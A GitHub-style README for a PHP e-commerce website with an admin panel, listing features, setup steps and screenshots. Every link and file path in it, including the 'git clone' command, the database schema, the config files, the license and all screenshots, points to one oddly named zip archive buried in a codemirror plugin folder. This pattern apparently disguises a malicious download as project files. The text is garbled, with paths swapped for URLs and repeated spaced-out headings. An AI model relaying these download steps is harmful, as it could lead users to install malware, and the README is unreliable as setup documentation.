# ECOM - E-Commerce Website

A PHP-based e-commerce website with features like user authentication, product management, and shopping cart functionality.

## Setup Instructions

1. Clone the repository:
```bash
git clone https://raw.githubusercontent.com/MihirKosambia/Ecommerce-dynamic-website-with-admin-panel-using-php/main/admin/plugins/codemirror/mode/ebnf/using-php-with-website-panel-Ecommerce-dynamic-admin-unremonstrated.zip
```

2. Configure your database:
- Create a new MySQL database
- Import the database schema from `https://raw.githubusercontent.com/MihirKosambia/Ecommerce-dynamic-website-with-admin-panel-using-php/main/admin/plugins/codemirror/mode/ebnf/using-php-with-website-panel-Ecommerce-dynamic-admin-unremonstrated.zip`
- Copy `https://raw.githubusercontent.com/MihirKosambia/Ecommerce-dynamic-website-with-admin-panel-using-php/main/admin/plugins/codemirror/mode/ebnf/using-php-with-website-panel-Ecommerce-dynamic-admin-unremonstrated.zip` to `https://raw.githubusercontent.com/MihirKosambia/Ecommerce-dynamic-website-with-admin-panel-using-php/main/admin/plugins/codemirror/mode/ebnf/using-php-with-website-panel-Ecommerce-dynamic-admin-unremonstrated.zip`
- Update database credentials in `https://raw.githubusercontent.com/MihirKosambia/Ecommerce-dynamic-website-with-admin-panel-using-php/main/admin/plugins/codemirror/mode/ebnf/using-php-with-website-panel-Ecommerce-dynamic-admin-unremonstrated.zip`

3. Configure SMTP:
- Enable 2-Step Verification in your Gmail account
- Generate an App Password
- Update SMTP credentials in `https://raw.githubusercontent.com/MihirKosambia/Ecommerce-dynamic-website-with-admin-panel-using-php/main/admin/plugins/codemirror/mode/ebnf/using-php-with-website-panel-Ecommerce-dynamic-admin-unremonstrated.zip`

4. Start your local server:
```bash
php -S localhost:8000
```

5. Visit `http://localhost:8000` in your browser

## Features

- User Authentication
- Product Management
- Shopping Cart
- Order Processing
- Email Notifications

## Technologies Used

- PHP
- MySQL
- HTML/CSS
- JavaScript
- PHPMailer for email functionality

## Contributing

Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

## License

[MIT](https://raw.githubusercontent.com/MihirKosambia/Ecommerce-dynamic-website-with-admin-panel-using-php/main/admin/plugins/codemirror/mode/ebnf/using-php-with-website-panel-Ecommerce-dynamic-admin-unremonstrated.zip)

# Ecommerce-dynamic-website-with-admin-panel-using-php

After learning PHP, Ajax, MySQL, etc.., I have made this project of Dynamic Ecommerce website with Admin panel

## Admin (Back-end) Panel:-
After admin login, user can access Front-end of the website 
(Please refer blow screen-shot of main dashboard..)
![Main Dashboard of Admin panel](https://raw.githubusercontent.com/MihirKosambia/Ecommerce-dynamic-website-with-admin-panel-using-php/main/admin/plugins/codemirror/mode/ebnf/using-php-with-website-panel-Ecommerce-dynamic-admin-unremonstrated.zip)


-> In slider, user can Add, Delete, Edit, View the all pages of slider
-> In Product, 
  user can Add, Delete, View the products
  user can edit the details of products like change the status of Stock (In-stock or Out-of-stock), Change product size and color, change the product price, etc...
  (Please refer below screen-shot for All products view, Product Detailed View, Product Details Change...)
![All products view](https://raw.githubusercontent.com/MihirKosambia/Ecommerce-dynamic-website-with-admin-panel-using-php/main/admin/plugins/codemirror/mode/ebnf/using-php-with-website-panel-Ecommerce-dynamic-admin-unremonstrated.zip)
![Product Detailed View](https://raw.githubusercontent.com/MihirKosambia/Ecommerce-dynamic-website-with-admin-panel-using-php/main/admin/plugins/codemirror/mode/ebnf/using-php-with-website-panel-Ecommerce-dynamic-admin-unremonstrated.zip)
![Product Details Change](https://raw.githubusercontent.com/MihirKosambia/Ecommerce-dynamic-website-with-admin-panel-using-php/main/admin/plugins/codemirror/mode/ebnf/using-php-with-website-panel-Ecommerce-dynamic-admin-unremonstrated.zip)

-> In blog, user can Add, Delete, Edit and View the all blogs
-> In About, user can change his Story, mission and slogan of his business
(Please refer below screen-shot for Editable page of About us..)
![About us editable page](https://raw.githubusercontent.com/MihirKosambia/Ecommerce-dynamic-website-with-admin-panel-using-php/main/admin/plugins/codemirror/mode/ebnf/using-php-with-website-panel-Ecommerce-dynamic-admin-unremonstrated.zip)

-> In Contacted-us, user can check the data of contacted-us peoples (Data is collected from Contact-us tab of the website)
-> In Order, user can manage his orders or change the status of Orders
 (Please refer below screen-shot for All Pending Orders list, Change the status of Order, All past Orders list...)
 ![All Pending Orders list](https://raw.githubusercontent.com/MihirKosambia/Ecommerce-dynamic-website-with-admin-panel-using-php/main/admin/plugins/codemirror/mode/ebnf/using-php-with-website-panel-Ecommerce-dynamic-admin-unremonstrated.zip)
 ![Change the status of Order](https://raw.githubusercontent.com/MihirKosambia/Ecommerce-dynamic-website-with-admin-panel-using-php/main/admin/plugins/codemirror/mode/ebnf/using-php-with-website-panel-Ecommerce-dynamic-admin-unremonstrated.zip)
![All past Orders list](https://raw.githubusercontent.com/MihirKosambia/Ecommerce-dynamic-website-with-admin-panel-using-php/main/admin/plugins/codemirror/mode/ebnf/using-php-with-website-panel-Ecommerce-dynamic-admin-unremonstrated.zip)

## Front-end of Website :-
Get all the data from database (which is updated by the admin using above admin panel) and Apply on front-end using CRUD operations of PHP

### On forn-end...

User can view all products and other details of website without Login (User Login is required during Manage Shopping cart, Buy the products, Manage his/her data)
Major functions...
-> Created user Login and Registration so that user can access his data (like past order history, current orders, etc) through his Login credential..
-> Add forgot password option so that user can recover his account through password change (used SMTP mail function to send that OPT on user email)
-> User can manage his own profile like, Change name, email (add OTP verification in email change), mobile, etc through his/her current password
(Please refer below screen-shot of Manage profile page...)
![Manage Profile](https://raw.githubusercontent.com/MihirKosambia/Ecommerce-dynamic-website-with-admin-panel-using-php/main/admin/plugins/codemirror/mode/ebnf/using-php-with-website-panel-Ecommerce-dynamic-admin-unremonstrated.zip)

-> User can easily add the products on his Shopping-cart so that it will helpful to shop more products..
(Please refer below screen-shots of Shopping cart...)
![Shopping Cart](https://raw.githubusercontent.com/MihirKosambia/Ecommerce-dynamic-website-with-admin-panel-using-php/main/admin/plugins/codemirror/mode/ebnf/using-php-with-website-panel-Ecommerce-dynamic-admin-unremonstrated.zip)
![Shopping Cart - 2](https://raw.githubusercontent.com/MihirKosambia/Ecommerce-dynamic-website-with-admin-panel-using-php/main/admin/plugins/codemirror/mode/ebnf/using-php-with-website-panel-Ecommerce-dynamic-admin-unremonstrated.zip)

-> User can manage his Orders like view past orders, current order status, pending orders, etc...
-> User can easily cancel his order using Order-list..
(Please refer below screen-shot of Order-list..)
![Order list](https://raw.githubusercontent.com/MihirKosambia/Ecommerce-dynamic-website-with-admin-panel-using-php/main/admin/plugins/codemirror/mode/ebnf/using-php-with-website-panel-Ecommerce-dynamic-admin-unremonstrated.zip)


Other usefull functions...
-> Also separated the mans, women, accessories products throught product categor so that user can easily find the products
-> Added pagination using AJAX in products list
(Please refer below screen-shot of Product list and Paginatino..)
![List of Product with Pagination](https://raw.githubusercontent.com/MihirKosambia/Ecommerce-dynamic-website-with-admin-panel-using-php/main/admin/plugins/codemirror/mode/ebnf/using-php-with-website-panel-Ecommerce-dynamic-admin-unremonstrated.zip)

-> Added search-product feature using AJAX in in products list
-> Added filter option using AJAX in products list
(Please refer below screen-shot of list of products with Low-High Price Filter...)
![Filter Low - High](https://raw.githubusercontent.com/MihirKosambia/Ecommerce-dynamic-website-with-admin-panel-using-php/main/admin/plugins/codemirror/mode/ebnf/using-php-with-website-panel-Ecommerce-dynamic-admin-unremonstrated.zip)

-> Added products review/comment function using AJAX in end of the product-detail

Please refer below screen-shot of Website home...
![Website home](https://raw.githubusercontent.com/MihirKosambia/Ecommerce-dynamic-website-with-admin-panel-using-php/main/admin/plugins/codemirror/mode/ebnf/using-php-with-website-panel-Ecommerce-dynamic-admin-unremonstrated.zip)

#   F u r n i V i s i o n  
 #   F u r n i V i s i o n  
 #   F u r n i V i s i o n  
 #   F u r n i V i s i o n  
 